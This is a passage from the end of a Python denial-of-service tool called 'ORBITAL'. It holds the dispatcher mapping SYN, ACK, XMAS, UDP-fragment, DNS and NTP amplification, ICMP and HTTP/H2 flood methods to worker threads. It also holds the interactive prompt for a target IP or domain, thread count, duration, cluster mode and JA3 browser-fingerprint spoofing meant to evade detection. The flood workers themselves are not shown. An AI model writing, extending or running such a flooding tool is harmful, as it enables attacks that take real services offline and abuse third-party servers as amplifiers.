                'TCP': self.tcp_worker, 'SYN': self.syn_worker, 'ACK': self.ack_worker,
                'RST': self.rst_worker, 'FIN': self.fin_worker, 'XMAS': self.xmas_worker,
                'UDP': self.udp_worker, 'UDP-FRAG': self.udp_frag_worker,
                'DNS-AMP': self.dns_amp_worker, 'NTP-AMP': self.ntp_amp_worker,
                'ICMP': self.icmp_worker,
            }
            
            worker_func = method_map.get(self.method, self.http_worker)
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(worker_func, i) for i in range(self.threads)]
                print(f"{Fore.GREEN}[ORBITAL RUNNING] {self.threads} threads!\n")
                
                try:
                    time.sleep(self.duration)
                except KeyboardInterrupt:
                    pass
                
                self.running.value = 0
        
        time.sleep(2)
        
        with self.stats_lock:
            final_count = self.request_count.value
            final_bytes = self.bytes_sent.value
        
        print(f"\n{Fore.YELLOW}{'='*100}")
        print(f"{Fore.CYAN}ORBITAL FINAL RESULTS")
        print(f"{Fore.YELLOW}{'='*100}")
        print(f"{Fore.WHITE}Total Requests: {Fore.GREEN}{final_count:,}")
        print(f"{Fore.WHITE}Total Sent: {Fore.GREEN}{final_bytes/1048576:.2f} MB")
        if self.duration > 0:
            print(f"{Fore.WHITE}Average RPS: {Fore.GREEN}{final_count/self.duration:.0f}")
            print(f"{Fore.WHITE}Average BW: {Fore.GREEN}{(final_bytes*8)/(self.duration*1048576):.2f} Mbps")
        print(f"{Fore.YELLOW}{'='*100}")

def main():
    clear()
    print(banner)
    
    try:
        choice = input(f"{Fore.YELLOW}[{Fore.RED}?{Fore.YELLOW}] {Fore.GREEN}Continue? (Y/n) or 'h' for help > {Fore.CYAN}").strip().lower()
        
        if choice == 'h':
            print(helper)
            input(f"\n{Fore.YELLOW}Press ENTER to continue...")
        elif choice == 'n':
            sys.exit(0)
        
        print(f"\n{Fore.GREEN}{'='*100}")
        print("ORBITAL CONFIGURATION")
        print(f"{'='*100}\n")
        
        tester = OrbitalUltimate()
        
        tester.target = input(f"{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}] {Fore.GREEN}TARGET {Fore.WHITE}(IP/Domain) > {Fore.CYAN}").strip()
        if not tester.target:
            return
        
        tester.method = input(f"{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}] {Fore.GREEN}METHOD {Fore.WHITE}(POST/GET/H2-POST/UDP/SYN/etc) > {Fore.CYAN}").strip().upper()
        if not tester.method:
            tester.method = 'POST'
        
        if tester.method in ['GET', 'POST', 'PUT', 'HEAD', 'DELETE', 'PATCH', 'OPTIONS', 'CONNECT', 'TRACE', 'RANDOM', 'H2-GET', 'H2-POST']:
            proto = input(f"{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}] {Fore.GREEN}PROTOCOL {Fore.WHITE}(h1/h2, default h1) > {Fore.CYAN}").strip().lower()
            tester.protocol = proto if proto in ['h1', 'h2', 'h3'] else 'h1'
            
            ja3 = input(f"{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}] {Fore.GREEN}JA3 PROFILE {Fore.WHITE}(chrome/firefox/safari) > {Fore.CYAN}").strip().lower()
            tester.ja3_profile = ja3 if ja3 in ['chrome', 'firefox', 'safari'] else 'chrome'
        
        threads = input(f"{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}] {Fore.GREEN}THREADS {Fore.WHITE}(default 500) > {Fore.CYAN}").strip()
        tester.threads = int(threads) if threads else 500
        
        duration = input(f"{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}] {Fore.GREEN}DURATION {Fore.WHITE}(seconds, default 60) > {Fore.CYAN}").strip()
        tester.duration = int(duration) if duration else 60
        
        cluster = input(f"{Fore.YELLOW}[{Fore.RED}>{Fore.YELLOW}] {Fore.GREEN}CLUSTER MODE {Fore.WHITE}(Y/n) > {Fore.CYAN}").strip().lower()
        tester.cluster_mode = cluster == 'y'
        
        tester.start()
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[ORBITAL] Stopped by user")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] {e}")

if __name__ == "__main__":
    main()
